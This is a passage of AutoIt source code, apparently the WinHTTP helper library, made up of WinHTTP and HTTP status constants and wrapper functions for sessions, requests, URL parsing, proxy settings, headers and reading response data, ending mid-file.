Global Const $error_winhttp_resend_request = 12032
Global Const $error_winhttp_secure_cert_date_invalid = 12037
Global Const $error_winhttp_secure_cert_cn_invalid = 12038
Global Const $error_winhttp_client_auth_cert_needed = 12044
Global Const $error_winhttp_secure_invalid_ca = 12045
Global Const $error_winhttp_secure_cert_rev_failed = 12057
Global Const $error_winhttp_cannot_call_before_open = 12100
Global Const $error_winhttp_cannot_call_before_send = 12101
Global Const $error_winhttp_cannot_call_after_send = 12102
Global Const $error_winhttp_cannot_call_after_open = 12103
Global Const $error_winhttp_header_not_found = 12150
Global Const $error_winhttp_invalid_server_response = 12152
Global Const $error_winhttp_invalid_header = 12153
Global Const $error_winhttp_invalid_query_request = 12154
Global Const $error_winhttp_header_already_exists = 12155
Global Const $error_winhttp_redirect_failed = 12156
Global Const $error_winhttp_secure_channel_error = 12157
Global Const $error_winhttp_bad_auto_proxy_script = 12166
Global Const $error_winhttp_unable_to_download_script = 12167
Global Const $error_winhttp_secure_invalid_cert = 12169
Global Const $error_winhttp_secure_cert_revoked = 12170
Global Const $error_winhttp_not_initialized = 12172
Global Const $error_winhttp_secure_failure = 12175
Global Const $error_winhttp_auto_proxy_service_error = 12178
Global Const $error_winhttp_secure_cert_wrong_usage = 12179
Global Const $error_winhttp_autodetection_failed = 12180
Global Const $error_winhttp_header_count_exceeded = 12181
Global Const $error_winhttp_header_size_overflow = 12182
Global Const $error_winhttp_chunked_encoding_header_size_overflow = 12183
Global Const $error_winhttp_response_drain_overflow = 12184
Global Const $error_winhttp_client_cert_no_private_key = 12185
Global Const $error_winhttp_client_cert_no_access_private_key = 12186
Global Const $winhttp_error_last = 12186
Global Const $http_status_continue = 100
Global Const $http_status_switch_protocols = 101
Global Const $http_status_ok = 200
Global Const $http_status_created = 201
Global Const $http_status_accepted = 202
Global Const $http_status_partial = 203
Global Const $http_status_no_content = 204
Global Const $http_status_reset_content = 205
Global Const $http_status_partial_content = 206
Global Const $http_status_webdav_multi_status = 207
Global Const $http_status_ambiguous = 300
Global Const $http_status_moved = 301
Global Const $http_status_redirect = 302
Global Const $http_status_redirect_method = 303
Global Const $http_status_not_modified = 304
Global Const $http_status_use_proxy = 305
Global Const $http_status_redirect_keep_verb = 307
Global Const $http_status_bad_request = 400
Global Const $http_status_denied = 401
Global Const $http_status_payment_req = 402
Global Const $http_status_forbidden = 403
Global Const $http_status_not_found = 404
Global Const $http_status_bad_method = 405
Global Const $http_status_none_acceptable = 406
Global Const $http_status_proxy_auth_req = 407
Global Const $http_status_request_timeout = 408
Global Const $http_status_conflict = 409
Global Const $http_status_gone = 410
Global Const $http_status_length_required = 411
Global Const $http_status_precond_failed = 412
Global Const $http_status_request_too_large = 413
Global Const $http_status_uri_too_long = 414
Global Const $http_status_unsupported_media = 415
Global Const $http_status_retry_with = 449
Global Const $http_status_server_error = 500
Global Const $http_status_not_supported = 501
Global Const $http_status_bad_gateway = 502
Global Const $http_status_service_unavail = 503
Global Const $http_status_gateway_timeout = 504
Global Const $http_status_version_not_sup = 505
Global Const $http_status_first = $http_status_continue
Global Const $http_status_last = $http_status_version_not_sup
Global Const $security_flag_ignore_unknown_ca = 256
Global Const $security_flag_ignore_cert_date_invalid = 8192
Global Const $security_flag_ignore_cert_cn_invalid = 4096
Global Const $security_flag_ignore_cert_wrong_usage = 512
Global Const $security_flag_secure = 1
Global Const $security_flag_strength_weak = 268435456
Global Const $security_flag_strength_medium = 1073741824
Global Const $security_flag_strength_strong = 536870912
Global Const $icu_no_encode = 536870912
Global Const $icu_decode = 268435456
Global Const $icu_no_meta = 134217728
Global Const $icu_encode_spaces_only = 67108864
Global Const $icu_browser_mode = 33554432
Global Const $icu_encode_percent = 4096
Global Const $winhttp_query_mime_version = 0
Global Const $winhttp_query_content_type = 1
Global Const $winhttp_query_content_transfer_encoding = 2
Global Const $winhttp_query_content_id = 3
Global Const $winhttp_query_content_description = 4
Global Const $winhttp_query_content_length = 5
Global Const $winhttp_query_content_language = 6
Global Const $winhttp_query_allow = 7
Global Const $winhttp_query_public = 8
Global Const $winhttp_query_date = 9
Global Const $winhttp_query_expires = 10
Global Const $winhttp_query_last_modified = 11
Global Const $winhttp_query_message_id = 12
Global Const $winhttp_query_uri = 13
Global Const $winhttp_query_derived_from = 14
Global Const $winhttp_query_cost = 15
Global Const $winhttp_query_link = 16
Global Const $winhttp_query_pragma = 17
Global Const $winhttp_query_version = 18
Global Const $winhttp_query_status_code = 19
Global Const $winhttp_query_status_text = 20
Global Const $winhttp_query_raw_headers = 21
Global Const $winhttp_query_raw_headers_crlf = 22
Global Const $winhttp_query_connection = 23
Global Const $winhttp_query_accept = 24
Global Const $winhttp_query_accept_charset = 25
Global Const $winhttp_query_accept_encoding = 26
Global Const $winhttp_query_accept_language = 27
Global Const $winhttp_query_authorization = 28
Global Const $winhttp_query_content_encoding = 29
Global Const $winhttp_query_forwarded = 30
Global Const $winhttp_query_from = 31
Global Const $winhttp_query_if_modified_since = 32
Global Const $winhttp_query_location = 33
Global Const $winhttp_query_orig_uri = 34
Global Const $winhttp_query_referer = 35
Global Const $winhttp_query_retry_after = 36
Global Const $winhttp_query_server = 37
Global Const $winhttp_query_title = 38
Global Const $winhttp_query_user_agent = 39
Global Const $winhttp_query_www_authenticate = 40
Global Const $winhttp_query_proxy_authenticate = 41
Global Const $winhttp_query_accept_ranges = 42
Global Const $winhttp_query_set_cookie = 43
Global Const $winhttp_query_cookie = 44
Global Const $winhttp_query_request_method = 45
Global Const $winhttp_query_refresh = 46
Global Const $winhttp_query_content_disposition = 47
Global Const $winhttp_query_age = 48
Global Const $winhttp_query_cache_control = 49
Global Const $winhttp_query_content_base = 50
Global Const $winhttp_query_content_location = 51
Global Const $winhttp_query_content_md5 = 52
Global Const $winhttp_query_content_range = 53
Global Const $winhttp_query_etag = 54
Global Const $winhttp_query_host = 55
Global Const $winhttp_query_if_match = 56
Global Const $winhttp_query_if_none_match = 57
Global Const $winhttp_query_if_range = 58
Global Const $winhttp_query_if_unmodified_since = 59
Global Const $winhttp_query_max_forwards = 60
Global Const $winhttp_query_proxy_authorization = 61
Global Const $winhttp_query_range = 62
Global Const $winhttp_query_transfer_encoding = 63
Global Const $winhttp_query_upgrade = 64
Global Const $winhttp_query_vary = 65
Global Const $winhttp_query_via = 66
Global Const $winhttp_query_warning = 67
Global Const $winhttp_query_expect = 68
Global Const $winhttp_query_proxy_connection = 69
Global Const $winhttp_query_unless_modified_since = 70
Global Const $winhttp_query_proxy_support = 75
Global Const $winhttp_query_authentication_info = 76
Global Const $winhttp_query_passport_urls = 77
Global Const $winhttp_query_passport_config = 78
Global Const $winhttp_query_max = 78
Global Const $winhttp_query_custom = 65535
Global Const $winhttp_query_flag_request_headers = -2147483648
Global Const $winhttp_query_flag_systemtime = 1073741824
Global Const $winhttp_query_flag_number = 536870912
Global Const $winhttp_callback_status_resolving_name = 1
Global Const $winhttp_callback_status_name_resolved = 2
Global Const $winhttp_callback_status_connecting_to_server = 4
Global Const $winhttp_callback_status_connected_to_server = 8
Global Const $winhttp_callback_status_sending_request = 16
Global Const $winhttp_callback_status_request_sent = 32
Global Const $winhttp_callback_status_receiving_response = 64
Global Const $winhttp_callback_status_response_received = 128
Global Const $winhttp_callback_status_closing_connection = 256
Global Const $winhttp_callback_status_connection_closed = 512
Global Const $winhttp_callback_status_handle_created = 1024
Global Const $winhttp_callback_status_handle_closing = 2048
Global Const $winhttp_callback_status_detecting_proxy = 4096
Global Const $winhttp_callback_status_redirect = 16384
Global Const $winhttp_callback_status_intermediate_response = 32768
Global Const $winhttp_callback_status_secure_failure = 65536
Global Const $winhttp_callback_status_headers_available = 131072
Global Const $winhttp_callback_status_data_available = 262144
Global Const $winhttp_callback_status_read_complete = 524288
Global Const $winhttp_callback_status_write_complete = 1048576
Global Const $winhttp_callback_status_request_error = 2097152
Global Const $winhttp_callback_status_sendrequest_complete = 4194304
Global Const $winhttp_callback_flag_resolve_name = 3
Global Const $winhttp_callback_flag_connect_to_server = 12
Global Const $winhttp_callback_flag_send_request = 48
Global Const $winhttp_callback_flag_receive_response = 192
Global Const $winhttp_callback_flag_close_connection = 768
Global Const $winhttp_callback_flag_handles = 3072
Global Const $winhttp_callback_flag_detecting_proxy = $winhttp_callback_status_detecting_proxy
Global Const $winhttp_callback_flag_redirect = $winhttp_callback_status_redirect
Global Const $winhttp_callback_flag_intermediate_response = $winhttp_callback_status_intermediate_response
Global Const $winhttp_callback_flag_secure_failure = $winhttp_callback_status_secure_failure
Global Const $winhttp_callback_flag_sendrequest_complete = $winhttp_callback_status_sendrequest_complete
Global Const $winhttp_callback_flag_headers_available = $winhttp_callback_status_headers_available
Global Const $winhttp_callback_flag_data_available = $winhttp_callback_status_data_available
Global Const $winhttp_callback_flag_read_complete = $winhttp_callback_status_read_complete
Global Const $winhttp_callback_flag_write_complete = $winhttp_callback_status_write_complete
Global Const $winhttp_callback_flag_request_error = $winhttp_callback_status_request_error
Global Const $winhttp_callback_flag_all_completions = 8257536
Global Const $winhttp_callback_flag_all_notifications = -1
Global Const $api_receive_response = 1
Global Const $api_query_data_available = 2
Global Const $api_read_data = 3
Global Const $api_write_data = 4
Global Const $api_send_request = 5
Global Const $winhttp_handle_type_session = 1
Global Const $winhttp_handle_type_connect = 2
Global Const $winhttp_handle_type_request = 3
Global Const $winhttp_callback_status_flag_cert_rev_failed = 1
Global Const $winhttp_callback_status_flag_invalid_cert = 2
Global Const $winhttp_callback_status_flag_cert_revoked = 4
Global Const $winhttp_callback_status_flag_invalid_ca = 8
Global Const $winhttp_callback_status_flag_cert_cn_invalid = 16
Global Const $winhttp_callback_status_flag_cert_date_invalid = 32
Global Const $winhttp_callback_status_flag_cert_wrong_usage = 64
Global Const $winhttp_callback_status_flag_security_channel_error = -2147483648
Global Const $winhttp_flag_secure_protocol_ssl2 = 8
Global Const $winhttp_flag_secure_protocol_ssl3 = 32
Global Const $winhttp_flag_secure_protocol_tls1 = 128
Global Const $winhttp_flag_secure_protocol_tls1_1 = 512
Global Const $winhttp_flag_secure_protocol_tls1_2 = 2048
Global Const $winhttp_flag_secure_protocol_all = 168
Global Const $winhttp_auth_scheme_basic = 1
Global Const $winhttp_auth_scheme_ntlm = 2
Global Const $winhttp_auth_scheme_passport = 4
Global Const $winhttp_auth_scheme_digest = 8
Global Const $winhttp_auth_scheme_negotiate = 16
Global Const $winhttp_auth_target_server = 0
Global Const $winhttp_auth_target_proxy = 1
Global Const $winhttp_autoproxy_auto_detect = 1
Global Const $winhttp_autoproxy_config_url = 2
Global Const $winhttp_autoproxy_run_inprocess = 65536
Global Const $winhttp_autoproxy_run_outprocess_only = 131072
Global Const $winhttp_auto_detect_type_dhcp = 1
Global Const $winhttp_auto_detect_type_dns_a = 2
Global Const $hwinhttpdll__winhttp = DllOpen("winhttp.dll")
DllOpen("winhttp.dll")

Func _winhttpaddrequestheaders($hrequest, $sheader, $imodifier = Default)
	__winhttpdefault($imodifier, $winhttp_addreq_flag_add_if_new)
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpAddRequestHeaders", "handle", $hrequest, "wstr", $sheader, "dword", -1, "dword", $imodifier)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, 0)
	Return 1
EndFunc

Func _winhttpcheckplatform()
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpCheckPlatform")
	If @error Then Return SetError(1, 0, 0)
	Return $acall[0]
EndFunc

Func _winhttpclosehandle($hinternet)
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpCloseHandle", "handle", $hinternet)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, 0)
	Return 1
EndFunc

Func _winhttpconnect($hsession, $sservername, $iserverport = Default)
	Local $aurl = _winhttpcrackurl($sservername), $ischeme = 0
	If @error Then
		__winhttpdefault($iserverport, $internet_default_port)
	Else
		$sservername = $aurl[2]
		$iserverport = $aurl[3]
		$ischeme = $aurl[1]
	EndIf
	Local $acall = DllCall($hwinhttpdll__winhttp, "handle", "WinHttpConnect", "handle", $hsession, "wstr", $sservername, "dword", $iserverport, "dword", 0)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, 0)
	_winhttpsetoption($acall[0], $winhttp_option_context_value, $ischeme)
	Return $acall[0]
EndFunc

Func _winhttpcrackurl($surl, $iflag = Default)
	__winhttpdefault($iflag, $icu_escape)
	Local $turl_components = DllStructCreate("dword StructSize;" & "ptr SchemeName;" & "dword SchemeNameLength;" & "int Scheme;" & "ptr HostName;" & "dword HostNameLength;" & "word Port;" & "ptr UserName;" & "dword UserNameLength;" & "ptr Password;" & "dword PasswordLength;" & "ptr UrlPath;" & "dword UrlPathLength;" & "ptr ExtraInfo;" & "dword ExtraInfoLength")
	DllStructSetData($turl_components, 1, DllStructGetSize($turl_components))
	Local $tbuffers[6]
	Local $iurllen = StringLen($surl)
	For $i = 0 To 5
		$tbuffers[$i] = DllStructCreate("wchar[" & $iurllen + 1 & "]")
	Next
	DllStructSetData($turl_components, "SchemeNameLength", $iurllen)
	DllStructSetData($turl_components, "SchemeName", DllStructGetPtr($tbuffers[0]))
	DllStructSetData($turl_components, "HostNameLength", $iurllen)
	DllStructSetData($turl_components, "HostName", DllStructGetPtr($tbuffers[1]))
	DllStructSetData($turl_components, "UserNameLength", $iurllen)
	DllStructSetData($turl_components, "UserName", DllStructGetPtr($tbuffers[2]))
	DllStructSetData($turl_components, "PasswordLength", $iurllen)
	DllStructSetData($turl_components, "Password", DllStructGetPtr($tbuffers[3]))
	DllStructSetData($turl_components, "UrlPathLength", $iurllen)
	DllStructSetData($turl_components, "UrlPath", DllStructGetPtr($tbuffers[4]))
	DllStructSetData($turl_components, "ExtraInfoLength", $iurllen)
	DllStructSetData($turl_components, "ExtraInfo", DllStructGetPtr($tbuffers[5]))
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpCrackUrl", "wstr", $surl, "dword", $iurllen, "dword", $iflag, "struct*", $turl_components)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, 0)
	Local $aret[8] = [DllStructGetData($tbuffers[0], 1), DllStructGetData($turl_components, "Scheme"), DllStructGetData($tbuffers[1], 1), DllStructGetData($turl_components, "Port"), DllStructGetData($tbuffers[2], 1), DllStructGetData($tbuffers[3], 1), DllStructGetData($tbuffers[4], 1), DllStructGetData($tbuffers[5], 1)]
	Return $aret
EndFunc

Func _winhttpcreateurl($aurlarray)
	If UBound($aurlarray) - 8 Then Return SetError(1, 0, "")
	Local $turl_components = DllStructCreate("dword StructSize;" & "ptr SchemeName;" & "dword SchemeNameLength;" & "int Scheme;" & "ptr HostName;" & "dword HostNameLength;" & "word Port;" & "ptr UserName;" & "dword UserNameLength;" & "ptr Password;" & "dword PasswordLength;" & "ptr UrlPath;" & "dword UrlPathLength;" & "ptr ExtraInfo;" & "dword ExtraInfoLength;")
	DllStructSetData($turl_components, 1, DllStructGetSize($turl_components))
	Local $tbuffers[6][2]
	$tbuffers[0][1] = StringLen($aurlarray[0])
	If $tbuffers[0][1] Then
		$tbuffers[0][0] = DllStructCreate("wchar[" & $tbuffers[0][1] + 1 & "]")
		DllStructSetData($tbuffers[0][0], 1, $aurlarray[0])
	EndIf
	$tbuffers[1][1] = StringLen($aurlarray[2])
	If $tbuffers[1][1] Then
		$tbuffers[1][0] = DllStructCreate("wchar[" & $tbuffers[1][1] + 1 & "]")
		DllStructSetData($tbuffers[1][0], 1, $aurlarray[2])
	EndIf
	$tbuffers[2][1] = StringLen($aurlarray[4])
	If $tbuffers[2][1] Then
		$tbuffers[2][0] = DllStructCreate("wchar[" & $tbuffers[2][1] + 1 & "]")
		DllStructSetData($tbuffers[2][0], 1, $aurlarray[4])
	EndIf
	$tbuffers[3][1] = StringLen($aurlarray[5])
	If $tbuffers[3][1] Then
		$tbuffers[3][0] = DllStructCreate("wchar[" & $tbuffers[3][1] + 1 & "]")
		DllStructSetData($tbuffers[3][0], 1, $aurlarray[5])
	EndIf
	$tbuffers[4][1] = StringLen($aurlarray[6])
	If $tbuffers[4][1] Then
		$tbuffers[4][0] = DllStructCreate("wchar[" & $tbuffers[4][1] + 1 & "]")
		DllStructSetData($tbuffers[4][0], 1, $aurlarray[6])
	EndIf
	$tbuffers[5][1] = StringLen($aurlarray[7])
	If $tbuffers[5][1] Then
		$tbuffers[5][0] = DllStructCreate("wchar[" & $tbuffers[5][1] + 1 & "]")
		DllStructSetData($tbuffers[5][0], 1, $aurlarray[7])
	EndIf
	DllStructSetData($turl_components, "SchemeNameLength", $tbuffers[0][1])
	DllStructSetData($turl_components, "SchemeName", DllStructGetPtr($tbuffers[0][0]))
	DllStructSetData($turl_components, "HostNameLength", $tbuffers[1][1])
	DllStructSetData($turl_components, "HostName", DllStructGetPtr($tbuffers[1][0]))
	DllStructSetData($turl_components, "UserNameLength", $tbuffers[2][1])
	DllStructSetData($turl_components, "UserName", DllStructGetPtr($tbuffers[2][0]))
	DllStructSetData($turl_components, "PasswordLength", $tbuffers[3][1])
	DllStructSetData($turl_components, "Password", DllStructGetPtr($tbuffers[3][0]))
	DllStructSetData($turl_components, "UrlPathLength", $tbuffers[4][1])
	DllStructSetData($turl_components, "UrlPath", DllStructGetPtr($tbuffers[4][0]))
	DllStructSetData($turl_components, "ExtraInfoLength", $tbuffers[5][1])
	DllStructSetData($turl_components, "ExtraInfo", DllStructGetPtr($tbuffers[5][0]))
	DllStructSetData($turl_components, "Scheme", $aurlarray[1])
	DllStructSetData($turl_components, "Port", $aurlarray[3])
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpCreateUrl", "struct*", $turl_components, "dword", $icu_escape, "ptr", 0, "dword*", 0)
	If @error Then Return SetError(2, 0, "")
	Local $iurllen = $acall[4]
	Local $urlbuffer = DllStructCreate("wchar[" & ($iurllen + 1) & "]")
	$acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpCreateUrl", "struct*", $turl_components, "dword", $icu_escape, "struct*", $urlbuffer, "dword*", $iurllen)
	If @error OR NOT $acall[0] Then Return SetError(3, 0, "")
	Return DllStructGetData($urlbuffer, 1)
EndFunc

Func _winhttpdetectautoproxyconfigurl($iautodetectflags)
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpDetectAutoProxyConfigUrl", "dword", $iautodetectflags, "ptr*", 0)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, "")
	Local $pstr = $acall[2]
	If $pstr Then
		Local $ilen = __winhttpptrstringlenw($pstr)
		If @error Then Return SetError(2, 0, "")
		Local $tstring = DllStructCreate("wchar[" & $ilen + 1 & "]", $pstr)
		Local $sstring = DllStructGetData($tstring, 1)
		__winhttpmemglobalfree($pstr)
		Return $sstring
	EndIf
	Return ""
EndFunc

Func _winhttpgetdefaultproxyconfiguration()
	Local $twinhttp_proxy_info = DllStructCreate("dword AccessType;" & "ptr Proxy;" & "ptr ProxyBypass")
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpGetDefaultProxyConfiguration", "struct*", $twinhttp_proxy_info)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, 0)
	Local $iaccesstype = DllStructGetData($twinhttp_proxy_info, "AccessType")
	Local $pproxy = DllStructGetData($twinhttp_proxy_info, "Proxy")
	Local $pproxybypass = DllStructGetData($twinhttp_proxy_info, "ProxyBypass")
	Local $sproxy
	If $pproxy Then
		Local $iproxylen = __winhttpptrstringlenw($pproxy)
		If NOT @error Then
			Local $tproxy = DllStructCreate("wchar[" & $iproxylen + 1 & "]", $pproxy)
			$sproxy = DllStructGetData($tproxy, 1)
			__winhttpmemglobalfree($pproxy)
		EndIf
	EndIf
	Local $sproxybypass
	If $pproxybypass Then
		Local $iproxybypasslen = __winhttpptrstringlenw($pproxybypass)
		If NOT @error Then
			Local $tproxybypass = DllStructCreate("wchar[" & $iproxybypasslen + 1 & "]", $pproxybypass)
			$sproxybypass = DllStructGetData($tproxybypass, 1)
			__winhttpmemglobalfree($pproxybypass)
		EndIf
	EndIf
	Local $aret[3] = [$iaccesstype, $sproxy, $sproxybypass]
	Return $aret
EndFunc

Func _winhttpgetieproxyconfigforcurrentuser()
	Local $twinhttp_current_user_ie_proxy_config = DllStructCreate("int AutoDetect;" & "ptr AutoConfigUrl;" & "ptr Proxy;" & "ptr ProxyBypass;")
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpGetIEProxyConfigForCurrentUser", "struct*", $twinhttp_current_user_ie_proxy_config)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, 0)
	Local $iautodetect = DllStructGetData($twinhttp_current_user_ie_proxy_config, "AutoDetect")
	Local $pautoconfigurl = DllStructGetData($twinhttp_current_user_ie_proxy_config, "AutoConfigUrl")
	Local $pproxy = DllStructGetData($twinhttp_current_user_ie_proxy_config, "Proxy")
	Local $pproxybypass = DllStructGetData($twinhttp_current_user_ie_proxy_config, "ProxyBypass")
	Local $sautoconfigurl
	If $pautoconfigurl Then
		Local $iautoconfigurllen = __winhttpptrstringlenw($pautoconfigurl)
		If NOT @error Then
			Local $tautoconfigurl = DllStructCreate("wchar[" & $iautoconfigurllen + 1 & "]", $pautoconfigurl)
			$sautoconfigurl = DllStructGetData($tautoconfigurl, 1)
			__winhttpmemglobalfree($pautoconfigurl)
		EndIf
	EndIf
	Local $sproxy
	If $pproxy Then
		Local $iproxylen = __winhttpptrstringlenw($pproxy)
		If NOT @error Then
			Local $tproxy = DllStructCreate("wchar[" & $iproxylen + 1 & "]", $pproxy)
			$sproxy = DllStructGetData($tproxy, 1)
			__winhttpmemglobalfree($pproxy)
		EndIf
	EndIf
	Local $sproxybypass
	If $pproxybypass Then
		Local $iproxybypasslen = __winhttpptrstringlenw($pproxybypass)
		If NOT @error Then
			Local $tproxybypass = DllStructCreate("wchar[" & $iproxybypasslen + 1 & "]", $pproxybypass)
			$sproxybypass = DllStructGetData($tproxybypass, 1)
			__winhttpmemglobalfree($pproxybypass)
		EndIf
	EndIf
	Local $aoutput[4] = [$iautodetect, $sautoconfigurl, $sproxy, $sproxybypass]
	Return $aoutput
EndFunc

Func _winhttpopen($suseragent = Default, $iaccesstype = Default, $sproxyname = Default, $sproxybypass = Default, $iflag = Default)
	__winhttpdefault($suseragent, __winhttpua())
	__winhttpdefault($iaccesstype, $winhttp_access_type_no_proxy)
	__winhttpdefault($sproxyname, $winhttp_no_proxy_name)
	__winhttpdefault($sproxybypass, $winhttp_no_proxy_bypass)
	__winhttpdefault($iflag, 0)
	Local $acall = DllCall($hwinhttpdll__winhttp, "handle", "WinHttpOpen", "wstr", $suseragent, "dword", $iaccesstype, "wstr", $sproxyname, "wstr", $sproxybypass, "dword", $iflag)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, 0)
	If $iflag = $winhttp_flag_async Then _winhttpsetoption($acall[0], $winhttp_option_context_value, $winhttp_flag_async)
	Return $acall[0]
EndFunc

Func _winhttpopenrequest($hconnect, $sverb = Default, $sobjectname = Default, $sversion = Default, $sreferrer = Default, $saccepttypes = Default, $iflags = Default)
	__winhttpdefault($sverb, "GET")
	__winhttpdefault($sobjectname, "")
	__winhttpdefault($sversion, "HTTP/1.1")
	__winhttpdefault($sreferrer, $winhttp_no_referer)
	__winhttpdefault($iflags, $winhttp_flag_escape_disable)
	Local $paccepttypes
	If $saccepttypes = Default OR Number($saccepttypes) = -1 Then
		$paccepttypes = $winhttp_default_accept_types
	Else
		Local $atypes = StringSplit($saccepttypes, ",", 2)
		Local $taccepttypes = DllStructCreate("ptr[" & UBound($atypes) + 1 & "]")
		Local $ttype[UBound($atypes)]
		For $i = 0 To UBound($atypes) - 1
			$ttype[$i] = DllStructCreate("wchar[" & StringLen($atypes[$i]) + 1 & "]")
			DllStructSetData($ttype[$i], 1, $atypes[$i])
			DllStructSetData($taccepttypes, 1, DllStructGetPtr($ttype[$i]), $i + 1)
		Next
		$paccepttypes = DllStructGetPtr($taccepttypes)
	EndIf
	Local $acall = DllCall($hwinhttpdll__winhttp, "handle", "WinHttpOpenRequest", "handle", $hconnect, "wstr", StringUpper($sverb), "wstr", $sobjectname, "wstr", StringUpper($sversion), "wstr", $sreferrer, "ptr", $paccepttypes, "dword", $iflags)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, 0)
	Return $acall[0]
EndFunc

Func _winhttpqueryauthschemes($hrequest, ByRef $isupportedschemes, ByRef $ifirstscheme, ByRef $iauthtarget)
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpQueryAuthSchemes", "handle", $hrequest, "dword*", 0, "dword*", 0, "dword*", 0)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, 0)
	$isupportedschemes = $acall[2]
	$ifirstscheme = $acall[3]
	$iauthtarget = $acall[4]
	Return 1
EndFunc

Func _winhttpquerydataavailable($hrequest)
	Local $sreadtype = "dword*"
	If BitAND(_winhttpqueryoption(_winhttpqueryoption(_winhttpqueryoption($hrequest, $winhttp_option_parent_handle), $winhttp_option_parent_handle), $winhttp_option_context_value), $winhttp_flag_async) Then $sreadtype = "ptr"
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpQueryDataAvailable", "handle", $hrequest, $sreadtype, 0)
	If @error Then Return SetError(1, 0, 0)
	Return SetExtended($acall[2], $acall[0])
EndFunc

Func _winhttpqueryheaders($hrequest, $iinfolevel = Default, $sname = Default, $iindex = Default)
	__winhttpdefault($iinfolevel, $winhttp_query_raw_headers_crlf)
	__winhttpdefault($sname, $winhttp_header_name_by_index)
	__winhttpdefault($iindex, $winhttp_no_header_index)
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpQueryHeaders", "handle", $hrequest, "dword", $iinfolevel, "wstr", $sname, "wstr", "", "dword*", 65536, "dword*", $iindex)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, "")
	Return SetExtended($acall[6], $acall[4])
EndFunc

Func _winhttpqueryoption($hinternet, $ioption)
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpQueryOption", "handle", $hinternet, "dword", $ioption, "ptr", 0, "dword*", 0)
	If @error OR $acall[0] Then Return SetError(1, 0, "")
	Local $isize = $acall[4]
	Local $tbuffer
	Switch $ioption
		Case $winhttp_option_connection_info, $winhttp_option_password, $winhttp_option_proxy_password, $winhttp_option_proxy_username, $winhttp_option_url, $winhttp_option_username, $winhttp_option_user_agent, $winhttp_option_passport_cobranding_text, $winhttp_option_passport_cobranding_url
			$tbuffer = DllStructCreate("wchar[" & $isize + 1 & "]")
		Case $winhttp_option_parent_handle, $winhttp_option_callback, $winhttp_option_server_cert_context
			$tbuffer = DllStructCreate("ptr")
		Case $winhttp_option_connect_timeout, $winhttp_autologon_security_level_high, $winhttp_autologon_security_level_low, $winhttp_autologon_security_level_medium, $winhttp_option_configure_passport_auth, $winhttp_option_connect_retries, $winhttp_option_extended_error, $winhttp_option_handle_type, $winhttp_option_max_conns_per_1_0_server, $winhttp_option_max_conns_per_server, $winhttp_option_max_http_automatic_redirects, $winhttp_option_receive_response_timeout, $winhttp_option_receive_timeout, $winhttp_option_resolve_timeout, $winhttp_option_security_flags, $winhttp_option_security_key_bitness, $winhttp_option_send_timeout
			$tbuffer = DllStructCreate("int")
		Case $winhttp_option_context_value
			$tbuffer = DllStructCreate("dword_ptr")
		Case Else
			$tbuffer = DllStructCreate("byte[" & $isize & "]")
	EndSwitch
	$acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpQueryOption", "handle", $hinternet, "dword", $ioption, "struct*", $tbuffer, "dword*", $isize)
	If @error OR NOT $acall[0] Then Return SetError(2, 0, "")
	Return DllStructGetData($tbuffer, 1)
EndFunc

Func _winhttpreaddata($hrequest, $imode = Default, $inumberofbytestoread = Default, $pbuffer = Default)
	__winhttpdefault($imode, 0)
	__winhttpdefault($inumberofbytestoread, 8192)
	Local $tbuffer, $voutonerror = ""
	If $imode = 2 Then $voutonerror = Binary($voutonerror)
	Switch $imode
		Case 1, 2
			If $pbuffer AND $pbuffer <> Default Then
				$tbuffer = DllStructCreate("byte[" & $inumberofbytestoread & "]", $pbuffer)
			Else
				$tbuffer = DllStructCreate("byte[" & $inumberofbytestoread & "]")
			EndIf
		Case Else
			$imode = 0
			If $pbuffer AND $pbuffer <> Default Then
				$tbuffer = DllStructCreate("char[" & $inumberofbytestoread & "]", $pbuffer)
			Else
				$tbuffer = DllStructCreate("char[" & $inumberofbytestoread & "]")
			EndIf
	EndSwitch
	Local $sreadtype = "dword*"
	If BitAND(_winhttpqueryoption(_winhttpqueryoption(_winhttpqueryoption($hrequest, $winhttp_option_parent_handle), $winhttp_option_parent_handle), $winhttp_option_context_value), $winhttp_flag_async) Then $sreadtype = "ptr"
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpReadData", "handle", $hrequest, "struct*", $tbuffer, "dword", $inumberofbytestoread, $sreadtype, 0)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, "")
	If NOT $acall[4] Then Return SetError(-1, 0, $voutonerror)
	If $acall[4] < $inumberofbytestoread Then
		Switch $imode
			Case 0
				Return SetExtended($acall[4], StringLeft(DllStructGetData($tbuffer, 1), $acall[4]))
			Case 1
				Return SetExtended($acall[4], BinaryToString(BinaryMid(DllStructGetData($tbuffer, 1), 1, $acall[4]), 4))
			Case 2
				Return SetExtended($acall[4], BinaryMid(DllStructGetData($tbuffer, 1), 1, $acall[4]))
		EndSwitch
	Else
		Switch $imode
			Case 0, 2
				Return SetExtended($acall[4], DllStructGetData($tbuffer, 1))
			Case 1
				Return SetExtended($acall[4], BinaryToString(DllStructGetData($tbuffer, 1), 4))
		EndSwitch
	EndIf
EndFunc

Func _winhttpreceiveresponse($hrequest)
